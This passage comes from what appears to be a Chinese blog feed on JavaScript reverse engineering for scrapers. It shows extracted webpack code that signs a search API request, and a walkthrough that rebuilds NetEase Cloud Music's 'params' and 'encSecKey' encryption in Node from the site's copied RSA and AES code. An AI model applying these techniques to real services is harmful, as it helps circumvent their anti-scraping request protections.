class="line">                    <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">                &#125;),</span><br><span class="line">                    a.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                    a.<span class="property">default</span> = &#123;</span><br><span class="line">                        <span class="number">6</span>: <span class="string">&quot;f&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    t.<span class="property">exports</span> = e.<span class="property">default</span></span><br><span class="line">            &#125;</span><br><span class="line">        ) ? n.<span class="title function_">apply</span>(e, i) : n) || (t.<span class="property">exports</span> = s)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">5355</span>: <span class="keyword">function</span> (<span class="params">t, e, a</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n, i, s;</span><br><span class="line">        <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> globalThis ? globalThis : <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> self &amp;&amp; self,</span><br><span class="line">            i = [e],</span><br><span class="line">        <span class="keyword">void</span> <span class="number">0</span> === (s = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> (n = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(a, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">                    <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">                &#125;),</span><br><span class="line">                    a.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                    a.<span class="property">default</span> = &#123;</span><br><span class="line">                        <span class="number">7</span>: <span class="string">&quot;i&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    t.<span class="property">exports</span> = e.<span class="property">default</span></span><br><span class="line">            &#125;</span><br><span class="line">        ) ? n.<span class="title function_">apply</span>(e, i) : n) || (t.<span class="property">exports</span> = s)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">5356</span>: <span class="keyword">function</span> (<span class="params">t, e, a</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n, i, s;</span><br><span class="line">        <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> globalThis ? globalThis : <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> self &amp;&amp; self,</span><br><span class="line">            i = [e],</span><br><span class="line">        <span class="keyword">void</span> <span class="number">0</span> === (s = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> (n = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(a, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">                    <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">                &#125;),</span><br><span class="line">                    a.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                    a.<span class="property">default</span> = &#123;</span><br><span class="line">                        <span class="number">8</span>: <span class="string">&quot;i&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    t.<span class="property">exports</span> = e.<span class="property">default</span></span><br><span class="line">            &#125;</span><br><span class="line">        ) ? n.<span class="title function_">apply</span>(e, i) : n) || (t.<span class="property">exports</span> = s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> n, i, r = e[<span class="number">0</span>], c = e[<span class="number">1</span>], l = e[<span class="number">2</span>], u = <span class="number">0</span>, f = []; u &lt; r.<span class="property">length</span>; u++)</span><br><span class="line">            i = r[u],</span><br><span class="line">            <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(s, i) &amp;&amp; s[i] &amp;&amp; f.<span class="title function_">push</span>(s[i][<span class="number">0</span>]),</span><br><span class="line">            s[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (n <span class="keyword">in</span> c)</span><br><span class="line">            <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(c, n) &amp;&amp; (t[n] = c[n]);</span><br><span class="line">        <span class="keyword">for</span> (d &amp;&amp; <span class="title function_">d</span>(e); f.<span class="property">length</span>; )</span><br><span class="line">            f.<span class="title function_">shift</span>()();</span><br><span class="line">        <span class="keyword">return</span> o.<span class="property">push</span>.<span class="title function_">apply</span>(o, l || []),</span><br><span class="line">        <span class="title function_">a</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t, e = <span class="number">0</span>; e &lt; o.<span class="property">length</span>; e++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> a = o[e], n = !<span class="number">0</span>, i = <span class="number">1</span>; i &lt; a.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> c = a[i];</span><br><span class="line">                <span class="number">0</span> !== s[c] &amp;&amp; (n = !<span class="number">1</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            n &amp;&amp; (o.<span class="title function_">splice</span>(e--, <span class="number">1</span>),</span><br><span class="line">            t = <span class="title function_">r</span>(r.<span class="property">s</span> = a[<span class="number">0</span>]))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> n = &#123;&#125;</span><br><span class="line">      , i = &#123;</span><br><span class="line">        <span class="number">22</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">      , s = &#123;</span><br><span class="line">        <span class="number">22</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">      , o = [];</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n[e])</span><br><span class="line">            <span class="keyword">return</span> n[e].<span class="property">exports</span>;</span><br><span class="line">        <span class="keyword">var</span> a = n[e] = &#123;</span><br><span class="line">            <span class="attr">i</span>: e,</span><br><span class="line">            <span class="attr">l</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> t[e].<span class="title function_">call</span>(a.<span class="property">exports</span>, a, a.<span class="property">exports</span>, r),</span><br><span class="line">        a.<span class="property">l</span> = !<span class="number">0</span>,</span><br><span class="line">        a.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">    rr = r;</span><br><span class="line">&#125;(aaa);</span><br><span class="line"></span><br><span class="line">i = <span class="title function_">rr</span>(<span class="number">3817</span>);</span><br><span class="line">a = <span class="string">&#x27;/api/search/searchmulti&#x27;</span>;</span><br><span class="line">s = <span class="title function_">rr</span>(<span class="number">3819</span>);</span><br><span class="line">e = &#123;</span><br><span class="line">    <span class="string">&quot;searchKey&quot;</span>: <span class="string">&quot;云南白药&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageIndex&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;pageSize&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e).<span class="title function_">toLowerCase</span>();</span><br><span class="line">res = <span class="title function_">i</span>(a + a + n, <span class="title function_">s</span>(a))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【原创】某易云音乐params和encSecKey参数逆向</title>
      <link href="/posts/17ca/"/>
      <url>/posts/17ca/</url>
      
        <content type="html"><![CDATA[<p><strong>环境：</strong></p><blockquote><p>Python 3.8.5<br>node v16.11.1<br>npm 8.0.0<br>Google Chrome 95.0.4638.54<br>PyCharm 2021.2.2</p></blockquote><p>本示例以评论为例，其他接口一样可以使用</p><p>使用了ajax技术请求，所以可以使用跟栈的方式找到加密点，但使用全局搜索的方式更快</p><p><img src="https://img.xpctf.cn/img/202110260351040.png"></p><p>点进去下断点，确定是我们加密参数，因为params和encSecKey都来自bUM9D，所以我们在bUM9D的位置下断点</p><p><img src="https://img.xpctf.cn/img/202110260344118.png"></p><p><img src="https://img.xpctf.cn/img/202110260345323.png"></p><p>点击下一页断点确实断住了，而且是我们要的数据</p><p><img src="https://img.xpctf.cn/img/202110260351122.png"></p><p>看到了一个asrsea方法，但这个方法不熟悉，应该是js给加到window了，先看看参数</p><p><img src="https://img.xpctf.cn/img/202110260345462.png"></p><p>通过控制台输出，i8a可能就是要加密的数据；</p><p>bsB3x([“流泪”, “强”])、bsB3x(WX6R.md)、bsB3x([“爱心”, “女孩”, “惊恐”, “大笑”])这三个参数应该是固定的，使用了混淆，如果不是固定的我们取js代码就行</p><p>现在来看看asrsea函数，（我再写文章的时候才搜的，原本想水一下，结果。。。。没窥屏!!!）</p><p><img src="https://img.xpctf.cn/img/202110260345452.png"></p><p>继续，继续，继续</p><p>跟进去window.asrsea函数，可以在控制台直接输入window.asrsea点进去，直接选中window.asrsea点进去，我喜欢用控制台的方式 ，方便下次进去。</p><p><img src="https://img.xpctf.cn/img/202110260345682.png" alt="PS：随便点演出就可以进去"></p><p>发现是个自执行函数，把d赋值给了window.asrsea变量，验证了我们的猜想；把整个自执行函数复制下来，丢到PyCharm里执行</p><p><img src="https://img.xpctf.cn/img/202110260345511.png"></p><p>发现window未定义，这个简单，在之前的文章中说过，直接把global赋值给window即可</p><p>运行成功了，以为这样就结束了，然而CryptoJS未定义，之前都是扣网站上的CryptoJS，这次我不想重蹈覆辙，一定有更简单的方式</p><p><img src="https://img.xpctf.cn/img/202110260345479.png"></p><p>在网上搜索了CryptoJS nodejs版，发现nodejs中不只有Crypto还有crypto-js</p><p>crypto-js参考文章：<a href="https://blog.csdn.net/weixin_43411585/article/details/108788483">https://blog.csdn.net/weixin_43411585/article/details/108788483</a></p><p>引用：CryptoJS (crypto.js) 是谷歌开发的一个纯JavaScript的加密算法类库，可以非常方便的在前端进行其所支持的加解密操作</p><ul><li>安装：<code>npm install crypto-js -g</code></li></ul><p>但是可能安装不上，参考这篇文章：<a href="http://www.blogjava.net/waterjava/archive/2019/10/19/434853.html">http://www.blogjava.net/waterjava/archive/2019/10/19/434853.html</a></p><p><img src="https://img.xpctf.cn/img/202110260346604.png"></p><p>安装肯定是安装上了，但是还是报错：Error: Cannot find module ‘crypto-js’</p><p>继续百度大法找到该文章：<a href="https://blog.csdn.net/mouday/article/details/100168155">https://blog.csdn.net/mouday/article/details/100168155</a></p><p>到此CryptoJS 的问题终于解决了。</p><p>运行后发现setMaxDigits未定义，现在就是缺啥补啥，结果补了半天发现越补越多（woc）</p><p><img src="https://img.xpctf.cn/img/202110260346949.png"></p><p>红线以上的网站的CryptoJS 和其他代码，红线以下的加密用到的函数和其他代码</p><p><img src="https://img.xpctf.cn/img/202110260346483.png"></p><p>两根红线中间的就是加密用到的代码（不要管多余的代码，我不管他用不用到，偏要全部复制），红线下的就是调用代码，其实我们可以一并复制，但我之前已经复制了</p><p><img src="https://img.xpctf.cn/img/202110260346289.png"></p><p>一堆东西丢进去，结果加密成功了。</p><p>全部js代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">paths</span>.<span class="title function_">push</span>(<span class="string">&#x27;C:\\Users\\Administrator\\AppData\\Roaming\\npm\\node_modules&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&quot;crypto-js&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span> = <span class="variable language_">global</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">RSAKeyPair</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">e</span> = <span class="title function_">biFromHex</span>(a),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">d</span> = <span class="title function_">biFromHex</span>(b),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">m</span> = <span class="title function_">biFromHex</span>(c),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">chunkSize</span> = <span class="number">2</span> * <span class="title function_">biHighIndex</span>(<span class="variable language_">this</span>.<span class="property">m</span>),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">radix</span> = <span class="number">16</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">barrett</span> = <span class="keyword">new</span> <span class="title class_">BarrettMu</span>(<span class="variable language_">this</span>.<span class="property">m</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">twoDigit</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">10</span> &gt; a ? <span class="string">&quot;0&quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="title class_">String</span>(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encryptedString</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> f, g, h, i, j, k, l, c = <span class="keyword">new</span> <span class="title class_">Array</span>, d = b.<span class="property">length</span>, e = <span class="number">0</span>; d &gt; e;)</span><br><span class="line">        c[e] = b.<span class="title function_">charCodeAt</span>(e),</span><br><span class="line">            e++;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="number">0</span> != c.<span class="property">length</span> % a.<span class="property">chunkSize</span>;)</span><br><span class="line">        c[e++] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (f = c.<span class="property">length</span>,</span><br><span class="line">             g = <span class="string">&quot;&quot;</span>,</span><br><span class="line">             e = <span class="number">0</span>; f &gt; e; e += a.<span class="property">chunkSize</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">                 h = <span class="number">0</span>,</span><br><span class="line">                 i = e; i &lt; e + a.<span class="property">chunkSize</span>; ++h)</span><br><span class="line">            j.<span class="property">digits</span>[h] = c[i++],</span><br><span class="line">                j.<span class="property">digits</span>[h] += c[i++] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">        k = a.<span class="property">barrett</span>.<span class="title function_">powMod</span>(j, a.<span class="property">e</span>),</span><br><span class="line">            l = <span class="number">16</span> == a.<span class="property">radix</span> ? <span class="title function_">biToHex</span>(k) : <span class="title function_">biToString</span>(k, a.<span class="property">radix</span>),</span><br><span class="line">            g += l + <span class="string">&quot; &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> g.<span class="title function_">substring</span>(<span class="number">0</span>, g.<span class="property">length</span> - <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decryptedString</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e, f, g, h, c = b.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>), d = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="number">0</span>; e &lt; c.<span class="property">length</span>; ++e)</span><br><span class="line">        <span class="keyword">for</span> (h = <span class="number">16</span> == a.<span class="property">radix</span> ? <span class="title function_">biFromHex</span>(c[e]) : <span class="title function_">biFromString</span>(c[e], a.<span class="property">radix</span>),</span><br><span class="line">                 g = a.<span class="property">barrett</span>.<span class="title function_">powMod</span>(h, a.<span class="property">d</span>),</span><br><span class="line">                 f = <span class="number">0</span>; f &lt;= <span class="title function_">biHighIndex</span>(g); ++f)</span><br><span class="line">            d += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">255</span> &amp; g.<span class="property">digits</span>[f], g.<span class="property">digits</span>[f] &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> == d.<span class="title function_">charCodeAt</span>(d.<span class="property">length</span> - <span class="number">1</span>) &amp;&amp; (d = d.<span class="title function_">substring</span>(<span class="number">0</span>, d.<span class="property">length</span> - <span class="number">1</span>)),</span><br><span class="line">        d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setMaxDigits</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    maxDigits = a,</span><br><span class="line">        <span class="variable constant_">ZERO_ARRAY</span> = <span class="keyword">new</span> <span class="title class_">Array</span>(maxDigits);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> b = <span class="number">0</span>; b &lt; <span class="variable constant_">ZERO_ARRAY</span>.<span class="property">length</span>; b++)</span><br><span class="line">        <span class="variable constant_">ZERO_ARRAY</span>[b] = <span class="number">0</span>;</span><br><span class="line">    bigZero = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">        bigOne = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">        bigOne.<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">BigInt</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">digits</span> = <span class="string">&quot;boolean&quot;</span> == <span class="keyword">typeof</span> a &amp;&amp; <span class="number">1</span> == a ? <span class="literal">null</span> : <span class="variable constant_">ZERO_ARRAY</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isNeg</span> = !<span 